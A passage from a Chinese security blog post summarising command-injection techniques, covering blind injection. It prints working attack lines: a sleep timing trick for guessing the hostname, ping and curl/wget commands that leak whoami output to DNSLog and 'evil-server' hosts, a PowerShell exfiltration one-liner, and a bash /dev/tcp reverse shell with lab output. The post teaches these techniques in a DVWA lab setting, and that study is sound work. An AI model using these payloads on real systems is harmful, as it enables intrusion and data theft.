+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep $(hostname | cut -c 1 |tr a 5)</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>我们执行的命令为hostname。我们假设它返回hacker。</p>
+</li>
+<li><p>它需要输出并将其传递给cut -c 1。这将选取hacker的第一个字符h。</p>
+</li>
+<li><p>接着通过tr命令将字符a替换为5。</p>
+</li>
+<li><p>然后将tr命令的输出传递给sleep命令，sleep h被执行将会立即出现报错，这是因为sleep后跟的参数只能为一个数字。然后，目标使用tr命令迭代字符。执行<code>sleep $(hostname | cut -c 1 | tr h 5)</code>命令，将需要5秒钟的时间。</p>
+</li>
+</ol>
+<p>这样我们就可以确定第一个字符是一个h。以此类推，我们就能将完整的主机名猜解出来。</p>
+<h3 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h3><p>无回显得命令执行语句可以使用DNSLog来查看结果。</p>
+<ul>
+<li>window</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317113629877.png" alt="image-20210317113629877"></p>
+<ul>
+<li>*nix</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 &#96;whoami&#96;.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317113750098.png" alt="image-20210317113750098"></p>
+<p>都可以看到我们的用户名显示在域名的最左边</p>
+<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>首先在自己的机器上开启监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
+<p>然后在命令执行处输入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp;/dev/tcp/ip地址/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>可以得到靶机的bash控制权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 4444</span></span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.91.143: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.143] 34728</span><br><span class="line">root@ubuntu18:/var/www/html<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">checksite</span><br><span class="line">DVWA-master</span><br><span class="line">index.html</span><br><span class="line">phpmyadmin</span><br><span class="line">test.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="HTTP外带"><a href="#HTTP外带" class="headerlink" title="HTTP外带"></a>HTTP外带</h3><ul>
+<li>Linux</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://evil-server/$(whoami)</span><br><span class="line">wget http://evil-server/$(whoami)</span><br><span class="line">curl http://evil-server/`whoami`</span><br><span class="line">curl xxxx.ceye.io/`whoami`</span><br><span class="line">curl http://xxxx.ceye.io/$(id|base64)</span><br><span class="line">ping -c 1 `whoami`.xxxx.ceye.io</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210324203716523.png" alt="image-20210324203716523"></p>
+<ul>
+<li>Window</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:</span><br><span class="line">for &#x2F;F %x in (&#39;whoami&#39;) do start http:&#x2F;&#x2F;xxx.ceye.io&#x2F;%x</span><br><span class="line">dns请求：</span><br><span class="line">获取计算机名：for &#x2F;F &quot;delims&#x3D;&quot; %i in (&#39;whoami&#39;) do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line">获取用户名：for &#x2F;F &quot;delims&#x3D; tokens&#x3D;2&quot; %i in (&#39;whoami&#39;) do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line"></span><br><span class="line">for &#x2F;F %x in (&#39;whoami&#39;) do powershell $a&#x3D;[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(&#39;%x&#39;));$b&#x3D;New-Object System.Net.WebClient;$b.DownloadString(&#39;http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#39;+$a);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210324205124046.png" alt="image-20210324205124046"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210324205511286.png" alt="image-20210324205511286"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://myt0.com/2019/03/03/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CWAF-Filter%E7%BB%95%E8%BF%87/" >PHP命令执行时的WAF&amp;Filter绕过方法<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" >巧用命令注入的N种方式<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：命令注入总结</li>
+        <li>Post author：John_Frod</li>
+        <li>Create time：2021-03-29 15:28:04</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2021/03/29/命令注入总结/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/03/29/%E5%8F%8D%E5%BC%B9shell/"
+                        >
+                            <span class="left arrow-icon flex-center" >
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">反弹shell</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/03/24/XSS%E6%80%BB%E7%BB%93/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">XSS总结</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center" >
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                    
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
+        </div>
+        
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+            <li class="search popup-trigger">
+                <i class="fas fa-search"></i>
+            </li>
+        
+
+        
+
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+    </ul>
+</div>
+
+    </div>
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-top flex-center">
+            <i class="fas fa-arrow-up"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="tools-ul-1">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="nav-text">命令注入总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="nav-text">常见的危险函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP"><span class="nav-text">PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system"><span class="nav-text">system</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec"><span class="nav-text">exec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#passthru"><span class="nav-text">passthru</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shell-exec"><span class="nav-text">shell_exec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#popen"><span class="nav-text">popen</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#proc-open"><span class="nav-text">proc_open</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="nav-text">反引号</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python"><span class="nav-text">Python</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system-1"><span class="nav-text">system</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#popen-1"><span class="nav-text">popen</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subprocess-call-subprocess-run"><span class="nav-text">subprocess.call&#x2F;subprocess.run</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#spawn"><span class="nav-text">spawn</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java"><span class="nav-text">Java</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#java-lang-Runtime-getRuntime-exec-command"><span class="nav-text">java.lang.Runtime.getRuntime().exec(command)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E4%B8%8B%E5%B8%B8%E7%94%A8%E7%9A%84%E7%AC%A6%E5%8F%B7"><span class="nav-text">Linux下常用的符号</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="nav-text">特殊符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="nav-text">通配符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87"><span class="nav-text">常用绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E5%88%86%E9%9A%94%E4%B8%8E%E6%89%A7%E8%A1%8C%E5%A4%9A%E6%9D%A1%E5%91%BD%E4%BB%A4"><span class="nav-text">命令分隔与执行多条命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-escapeshellcmd"><span class="nav-text">绕过 escapeshellcmd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-text">黑名单绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-text">字符数限制绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BE%E4%BE%8B"><span class="nav-text">举例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9F%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">短命令执行</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-text">无回显的命令注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep"><span class="nav-text">sleep</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNSLog"><span class="nav-text">DNSLog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9-shell"><span class="nav-text">反弹 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E5%A4%96%E5%B8%A6"><span class="nav-text">HTTP外带</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+        
+    </aside>
+
+    <!-- image viewer -->
+    <div class="image-viewer-container">
+    <div class="img-box">
+        <img src="">
+    </div>
+</div>
+
+
+</div>
+
+
+
+    <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-icon">
+            <i class="fas fa-search"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
+    
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
+    
+
+
+</body>
+</html>
